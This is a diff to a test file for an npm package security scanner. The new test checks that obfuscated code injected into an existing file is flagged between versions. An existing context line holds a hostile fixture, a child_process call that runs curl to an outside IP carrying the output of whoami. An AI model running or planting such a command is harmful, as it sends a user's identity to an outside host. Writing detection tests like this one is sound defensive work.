@@ -260,3 +260,29 @@ def test_native_addon_install_build_is_low_but_hostile_commands_stay_flagged():
     hostile = "const cp = require('child_process');\ncp.execSync(`curl -s http://203.0.113.4/?u=$(whoami)`)"
     assert "TRACII-CODE-SHELL-EXFIL" in _flagged(_sr.analyze_package(
         _pkg({"install": "node build.js"}, {"build.js": hostile, "binding.gyp": "{}"})))
+
+
+def test_version_diff_reports_code_injected_into_existing_files():
+    from tracii.intake.npm_registry import PackageFiles
+    src = "function debug(ns) {\n  return ns;\n}\nmodule.exports = debug;\n"
+    old = PackageFiles("dbg", "1.0.0", {}, {"src/index.js": src, "README.md": "x"})
+    payload = "var " + ",".join(f"_0x{i:04x}=1" for i in range(400)) + ";"
+    new = PackageFiles("dbg", "1.0.1", {}, {"src/index.js": src + payload + "\n", "README.md": "x"})
+    d = diff_packages(old, new)
+    assert d["files_modified"] == ["src/index.js"] and d["security_relevant"]
+    f = next(x for x in d["findings"] if x["rule_or_advisory"] == "DIFF-CODE-INJECTED")
+    assert f["severity"] == "high" and any("character line added" in e["summary"] and e["line"] == 5 for e in f["evidence"])
+    assert d["code_changes"]["src/index.js"]["obfuscator_ids_added"] == 400
+
+    # ordinary edits, and a minified file that already had long lines, are not flagged
+    mini_old = "!function(){" + "a=1;" * 900 + "}();"
+    edit = PackageFiles("dbg", "1.0.2", {}, {"src/index.js": src.replace("return ns;", "return ns + '';"),
+                                               "dist/x.min.js": mini_old.replace("a=1", "b=2")})
+    d2 = diff_packages(PackageFiles("dbg", "1.0.1", {}, {"src/index.js": src, "dist/x.min.js": mini_old}), edit)
+    assert d2["files_modified"] == ["dist/x.min.js", "src/index.js"] and not d2["findings"] and not d2["security_relevant"]
+
+    # a capability new to one file counts even if the package used it elsewhere
+    old3 = PackageFiles("p", "1", {}, {"a.js": "require('child_process')", "b.js": "module.exports = 1"})
+    new3 = PackageFiles("p", "2", {}, {"a.js": "require('child_process')", "b.js": "module.exports = 1\nconst cp = require('child_process')"})
+    f3 = next(x for x in diff_packages(old3, new3)["findings"] if x["rule_or_advisory"] == "DIFF-CODE-INJECTED")
+    assert f3["severity"] == "medium" and f3["evidence"][0]["file"] == "b.js" and f3["evidence"][0]["line"] == 2
